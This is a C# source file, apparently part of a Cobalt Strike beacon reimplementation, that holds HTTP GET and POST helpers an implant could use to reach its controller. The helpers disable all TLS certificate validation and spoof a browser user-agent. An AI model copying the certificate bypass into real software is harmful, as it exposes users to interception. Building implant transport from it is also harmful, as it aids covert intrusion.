using Org.BouncyCastle.X509;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;

namespace CobaltStrikeSharp
{
    class Request
    {

        private static bool CheckValidationResult(object sender, System.Security.Cryptography.X509Certificates.X509Certificate certificate, X509Chain chain, SslPolicyErrors errors)
        {
            return true; 
        }

        public static Dictionary<string, string> _headers = new Dictionary<string, string>{
            {HttpRequestHeader.UserAgent.ToString(), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
        };
        public static byte[] doGet(String url, Dictionary<string, string> headers)
        {
           
            if (url.StartsWith("https", StringComparison.OrdinalIgnoreCase))
            {
                HttpWebRequest request = null;
                request = WebRequest.Create(url) as HttpWebRequest;
                ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(CheckValidationResult);
                request.ProtocolVersion = HttpVersion.Version11;
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;// SecurityProtocolType.Tls1.2; 
                request.KeepAlive = false;
                ServicePointManager.CheckCertificateRevocationList = true;
                ServicePointManager.DefaultConnectionLimit = 100;
                ServicePointManager.Expect100Continue = false;

                foreach (KeyValuePair<string, string> kv in _headers)
                {
                    request.Headers.Add(kv.Key, kv.Value);
                }
                foreach (KeyValuePair<string, string> kv in headers)
                {
                    request.Headers.Add(kv.Key, kv.Value);
                }
                request.Method = "GET";
                request.ContentType = "application/x-www-form-urlencoded";
                request.Referer = null;
                request.AllowAutoRedirect = true;
                request.Accept = "*/*";

                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Stream stream = response.GetResponseStream();
                string result = string.Empty;
                using (StreamReader sr = new StreamReader(stream))
                {
                    result = sr.ReadToEnd();
                }
                return Encoding.ASCII.GetBytes(result);
            }
            else
            {
                var handler = new HttpClientHandler
                {
                    UseCookies = false
                };
                var client = new HttpClient(handler);
                var httpRequestMessage = new HttpRequestMessage
                {
                    Method = HttpMethod.Get,
                    RequestUri = new Uri(url)
                };
                foreach (KeyValuePair<string, string> kv in _headers)
                {
                    httpRequestMessage.Headers.Add(kv.Key, kv.Value);
                }
                foreach (KeyValuePair<string, string> kv in headers)
                {
                    httpRequestMessage.Headers.Add(kv.Key, kv.Value);

                }
                var response = client.SendAsync(httpRequestMessage).Result;
                Task<byte[]> result = response.Content.ReadAsByteArrayAsync();
                return result.Result;
            }
        }

        public static byte[] doPost(String url, Dictionary<string, string> headers, byte[] data)
        {
            var handler = new HttpClientHandler
            {
                UseCookies = false
            };
            var client = new HttpClient(handler);
            var httpRequestMessage = new HttpRequestMessage
            {
                Method = HttpMethod.Post,
                RequestUri = new Uri(url),
                Content = new ByteArrayContent(data)
            };
            foreach (KeyValuePair<string, string> kv in _headers)
            {
                httpRequestMessage.Headers.Add(kv.Key, kv.Value);
            }
            if (headers != null)
            {
                foreach (KeyValuePair<string, string> kv in headers)
                {
                    httpRequestMessage.Headers.Add(kv.Key, kv.Value);

                }
            }           
            var response = client.SendAsync(httpRequestMessage).Result;
            Task<byte[]> result = response.Content.ReadAsByteArrayAsync();
            return result.Result;  
        }

    }
}
